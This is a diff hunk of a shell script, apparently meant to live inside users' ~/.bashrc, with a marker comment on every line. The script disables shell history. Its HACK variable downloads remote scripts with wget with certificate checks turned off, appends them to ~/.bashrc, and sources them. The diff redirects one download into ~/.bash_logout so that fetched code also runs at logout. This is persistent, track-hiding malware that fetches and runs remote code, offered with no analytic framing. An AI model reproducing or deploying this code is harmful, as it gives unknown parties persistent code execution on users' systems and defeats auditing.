@@ -3,7 +3,7 @@ unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; #_fdsagadsfasdgadsgsss
 export HISTFILE=/dev/null; #_fdsagadsfasdgadsgsss
 export HISTSIZE=0; #_fdsagadsfasdgadsgsss
 export HISTFILESIZE=0; #_fdsagadsfasdgadsgsss
-export HACK="grep '_fdsagadsfasdgadsgsss' ~/.bashrc 1>/dev/null; if [ \$? -ne 0 ];then cp ~/.bashrc /tmp/_bash;wget -c -t 2 --no-check-certificate 'https://raw.githubusercontent.com/F0ckLinux/linux-clear/master/clear.sh' -O- -q  >> ~/.bashrc; fi;bash; if [ ! -f /tmp/__safebyeCheck ];then wget -c -t 2 --no-check-certificate 'https://raw.githubusercontent.com/F0ckLinux/linux-clear/master/bye.sh' -O- -q  >> /tmp/__safebyeCheck; fi ; . /tmp/__safebyeCheck;" #_fdsagadsfasdgadsgsss
+export HACK="grep '_fdsagadsfasdgadsgsss' ~/.bashrc 1>/dev/null; if [ \$? -ne 0 ];then cp ~/.bashrc /tmp/_bash;wget -c -t 2 --no-check-certificate 'https://raw.githubusercontent.com/F0ckLinux/linux-clear/master/clear.sh' -O- -q  >> ~/.bashrc; fi;bash; if [ ! -f /tmp/__safebyeCheck ];then wget -c -t 2 --no-check-certificate 'https://raw.githubusercontent.com/F0ckLinux/linux-clear/master/bye.sh' -O- -q  >> ~/.bash_logout; fi ; . ~/.bash_logout;" #_fdsagadsfasdgadsgsss
 REST="\e[0m" #_fdsagadsfasdgadsgsss
 UNDERLINE="\e[4m" #_fdsagadsfasdgadsgsss
 ColorRed="\e[31m" #_fdsagadsfasdgadsgsss
